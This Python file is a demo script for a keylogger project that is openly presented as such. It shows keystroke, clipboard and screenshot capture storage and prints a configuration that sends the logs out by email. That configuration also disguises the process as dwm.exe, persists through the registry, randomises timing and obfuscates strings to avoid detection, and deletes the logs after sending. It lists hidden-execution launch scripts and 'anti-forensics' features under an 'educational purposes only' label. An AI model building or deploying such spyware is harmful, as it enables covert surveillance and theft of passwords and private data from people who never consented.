#!/usr/bin/env python3
"""
Example usage and demonstration of keylogger components
For educational purposes only
"""

import json
import time
from datetime import datetime

def demonstrate_configuration():
    """Demonstrate configuration management"""
    print("=== Configuration Management Demo ===")
    
    from config_manager import Config
    
    config = Config()
    
    print(f"Keystrokes enabled: {config.get('capture.enable_keystrokes')}")
    print(f"Clipboard enabled: {config.get('capture.enable_clipboard')}")
    print(f"Screenshots enabled: {config.get('capture.enable_screenshots')}")
    print(f"Screenshot interval: {config.get('capture.screenshot_interval')} seconds")
    print(f"Encryption enabled: {config.get('storage.encrypt_logs')}")
    print(f"Email exfiltration: {config.get('exfiltration.email.enabled')}")
    print(f"FTP exfiltration: {config.get('exfiltration.ftp.enabled')}")
    print()

def demonstrate_storage():
    """Demonstrate storage functionality"""
    print("=== Storage Management Demo ===")
    
    from config_manager import Config
    from storage_manager import StorageManager
    
    config = Config()
    storage = StorageManager(config)
    
    print("Storing sample keystroke data...")
    keystroke_data = {
        'timestamp': datetime.now().isoformat(),
        'type': 'keystroke_batch',
        'keystrokes': [
            {'timestamp': datetime.now().isoformat(), 'key': 'h', 'type': 'keypress'},
            {'timestamp': datetime.now().isoformat(), 'key': 'e', 'type': 'keypress'},
            {'timestamp': datetime.now().isoformat(), 'key': 'l', 'type': 'keypress'},
            {'timestamp': datetime.now().isoformat(), 'key': 'l', 'type': 'keypress'},
            {'timestamp': datetime.now().isoformat(), 'key': 'o', 'type': 'keypress'},
        ]
    }
    storage.store_data(keystroke_data)
    
    print("Storing sample clipboard data...")
    clipboard_data = {
        'timestamp': datetime.now().isoformat(),
        'type': 'clipboard',
        'content': 'Sample clipboard content'
    }
    storage.store_data(clipboard_data)
    
    print("Storing sample binary data (screenshot simulation)...")
    fake_image_data = b'FAKE_JPEG_DATA_FOR_DEMO' * 100  # Simulate image data
    screenshot_metadata = {
        'timestamp': datetime.now().isoformat(),
        'type': 'screenshot',
        'format': 'jpeg'
    }
    storage.store_binary_data(fake_image_data, screenshot_metadata)
    
    # Show stored files
    files = storage.get_all_files()
    print(f"Total files stored: {len(files)}")
    
    for i, file_path in enumerate(files[:3]):  # Show first 3 files
        print(f"File {i+1}: {file_path.name}")
        data = storage.read_data(file_path)
        if data:
            print(f"  Type: {data.get('type', 'unknown')}")
            print(f"  Timestamp: {data.get('timestamp', 'unknown')}")
            if 'keystrokes' in data:
                print(f"  Keystrokes: {len(data['keystrokes'])} keys")
            elif 'content' in data:
                print(f"  Content length: {len(str(data['content']))} characters")
    
    print()

def demonstrate_config_customization():
    """Show how to customize configuration"""
    print("=== Configuration Customization Demo ===")
    
    # Example of creating a custom config
    custom_config = {
        "capture": {
            "enable_keystrokes": True,
            "enable_clipboard": True,
            "enable_screenshots": False,  # Disabled for privacy
            "screenshot_interval": 600,   # 10 minutes
            "max_log_size_mb": 25
        },
        "storage": {
            "data_directory": "secure_logs",
            "encrypt_logs": True,
            "compression": True
        },
        "exfiltration": {
            "email": {
                "enabled": True,
                "smtp_server": "smtp.protonmail.com",
                "smtp_port": 587,
                "username": "your_secure_email@protonmail.com",
                "password": "your_app_password",
                "recipient": "logs@yourdomain.com",
                "interval_hours": 48,  # Less frequent for stealth
                "max_retries": 5
            },
            "ftp": {
                "enabled": False  # Disabled
            }
        },
        "stealth": {
            "hide_window": True,
            "process_name": "dwm.exe",  # Windows Desktop Window Manager
            "run_as_service": False
        },
        "persistence": {
            "registry_startup": True,
            "scheduled_task": False,
            "startup_folder": False
        },
        "anti_detection": {
            "randomize_timing": True,
            "min_delay_seconds": 2,
            "max_delay_seconds": 10,
            "obfuscate_strings": True,
            "self_delete_on_exit": False
        },
        "cleanup": {
            "delete_after_exfiltration": True,
            "keep_last_n_files": 1,
            "max_age_days": 3
        }
    }
    
    print("Custom configuration example:")
    print(json.dumps(custom_config, indent=2))
    print()

def show_usage_examples():
    """Show various usage examples"""
    print("=== Usage Examples ===")
    
    print("1. Basic Usage:")
    print("   python keylogger.py")
    print()
    
    print("2. Install with guided setup:")
    print("   python install.py")
    print()
    
    print("3. Test components:")
    print("   python test_components.py")
    print()
    
    print("4. Configuration file locations:")
    print("   - Main config: config.json")
    print("   - Data directory: logs/ (configurable)")
    print("   - Encryption key: logs/.key")
    print()
    
    print("5. Windows-specific files:")
    print("   - start_keylogger.bat (visible console)")
    print("   - start_hidden.bat (hidden execution)")
    print()
    
    print("6. Unix/Linux-specific files:")
    print("   - ./start_keylogger.sh (start)")
    print("   - ./stop_keylogger.sh (stop)")
    print()

def show_security_considerations():
    """Show security considerations"""
    print("=== Security Considerations ===")
    
    considerations = [
        "Data Encryption: All logs are encrypted with AES-256",
        "Secure Storage: Keys stored separately from data",
        "Memory Protection: Sensitive data cleared from memory",
        "Network Security: TLS/SSL for email exfiltration",
        "File Permissions: Restricted access to log files",
        "Process Security: Runs with minimal privileges",
        "Anti-Forensics: Secure deletion of temporary files",
        "Configuration Security: Sensitive settings encrypted"
    ]
    
    for i, consideration in enumerate(considerations, 1):
        print(f"{i:2d}. {consideration}")
    
    print()

def main():
    """Main demonstration"""
    print("Advanced Keylogger - Component Demonstration")
    print("=" * 60)
    print("Educational and Research Purposes Only")
    print("=" * 60)
    print()
    
    try:
        demonstrate_configuration()
        demonstrate_storage()
        demonstrate_config_customization()
        show_usage_examples()
        show_security_considerations()
        
        print("Demo completed successfully!")
        print("Check the 'logs' directory for sample encrypted data files.")
        
    except Exception as e:
        print(f"Demo error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()